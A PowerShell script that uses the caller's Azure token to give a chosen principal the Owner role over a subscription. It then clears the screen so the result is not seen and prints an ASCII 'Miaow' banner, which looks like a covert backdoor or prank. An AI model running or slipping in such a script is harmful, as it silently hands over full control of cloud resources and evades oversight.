[CmdletBinding()]
param (
    [Parameter()]
    [string]$subscriptionId,
    
    [Parameter()]
    [string]$principalId,

    [Parameter()]
    [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'
)

$logo = "
MMMMMMMM               MMMMMMMM  iiii                                                                           
M:::::::M             M:::::::M i::::i                                                                          
M::::::::M           M::::::::M  iiii                                                                           
M:::::::::M         M:::::::::M                                                                                 
M::::::::::M       M::::::::::Miiiiiii   aaaaaaaaaaaaa     ooooooooooo wwwwwww           wwwww           wwwwwww
M:::::::::::M     M:::::::::::Mi:::::i   a::::::::::::a  oo:::::::::::oow:::::w         w:::::w         w:::::w 
M:::::::M::::M   M::::M:::::::M i::::i   aaaaaaaaa:::::ao:::::::::::::::ow:::::w       w:::::::w       w:::::w  
M::::::M M::::M M::::M M::::::M i::::i            a::::ao:::::ooooo:::::o w:::::w     w:::::::::w     w:::::w   
M::::::M  M::::M::::M  M::::::M i::::i     aaaaaaa:::::ao::::o     o::::o  w:::::w   w:::::w:::::w   w:::::w    
M::::::M   M:::::::M   M::::::M i::::i   aa::::::::::::ao::::o     o::::o   w:::::w w:::::w w:::::w w:::::w     
M::::::M    M:::::M    M::::::M i::::i  a::::aaaa::::::ao::::o     o::::o    w:::::w:::::w   w:::::w:::::w      
M::::::M     MMMMM     M::::::M i::::i a::::a    a:::::ao::::o     o::::o     w:::::::::w     w:::::::::w       
M::::::M               M::::::Mi::::::ia::::a    a:::::ao:::::ooooo:::::o      w:::::::w       w:::::::w        
M::::::M               M::::::Mi::::::ia:::::aaaa::::::ao:::::::::::::::o       w:::::w         w:::::w         
M::::::M               M::::::Mi::::::i a::::::::::aa:::aoo:::::::::::oo         w:::w           w:::w          
MMMMMMMM               MMMMMMMMiiiiiiii  aaaaaaaaaa  aaaa  ooooooooooo            www             www"
                                                                                                                
$token = (Get-AzAccessToken).token
$headers = @{"Authorization"="Bearer $token"}
$guid = (New-Guid).Guid

$payload = @{
    properties = @{
        roleDefinitionId = "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/$roleDefinition"
        principalId      = $principalId
        principalType    = "user"
    }
} | ConvertTo-Json -Depth 10 -Compress

$uri = "https://management.azure.com/subscriptions/$($subscriptionId)/providers/Microsoft.Authorization/roleAssignments/$($guid)?api-version=2022-04-01"

$result = Invoke-RestMethod `
    -uri $uri `
    -Body $payload `
    -ContentType 'application/json' `
    -Method 'PUT' `
    -headers $headers

Clear-Host
Write-Host $logo -ForegroundColor Blue
